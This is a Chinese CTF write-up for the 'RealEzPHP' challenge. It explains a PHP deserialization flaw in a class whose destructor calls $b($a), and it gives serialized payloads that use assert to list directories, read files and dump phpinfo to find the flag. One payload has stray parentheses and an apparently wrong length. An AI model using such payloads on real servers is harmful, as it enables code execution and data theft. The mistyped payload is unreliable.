# RealEzPHP

## 知识点

1. assert(php 7.2 以下) 的命令执行
2. php反序列化

## 解题

刚拿到题目只看到一个骷髅头，查看源码找到 `time.php`

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

很显然就是反序列化的问题

当向data传入数据时，首先触发 `__construct` 构造类得到当前的时间，之后将要退出类时触发 `__destruct` 类来销毁，同时可以看到此处能够输出，说明可以从这里来入手。

```text
$b($a) 可以执行以b为函数名，a为参数的函数
```

这里先利用 `scandir` 看一下文件

```text
O:8:"HelloPhp":2:{s:1:"a";s:22:"var_dump(scandir('/'))";s:1:"b";s:6:"assert";}
```
```text
array(23) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(10) "FIag_!S_it" [4]=> string(3) "bin" [5]=> string(4) "boot" [6]=> string(3) "dev" [7]=> string(3) "etc" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(3) "sys" [20]=> string(3) "tmp" [21]=> string(3) "usr" [22]=> string(3) "var" }
```

看到 `FIag_!S_it` ，emm，先读下内容

本能地想到了 `file_get_content` 函数来获取文件内容

```text
O:8:"HelloPhp":2:{s:1:"a";s:57:"var_dump(base64_encode(file_get_contents('/FIag_!S_it')))))";s:1:"b";s:6:"assert";}
```

得到一个假flag `NPUCTF{this_is_not_a_fake_flag_but_true_flag}`

嗯，有点坑

后面想到命令执行，试过之后发现只有 `assert` 可以用，直接看看phpinfo

```text
O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

在phpinfo里直接找到flag



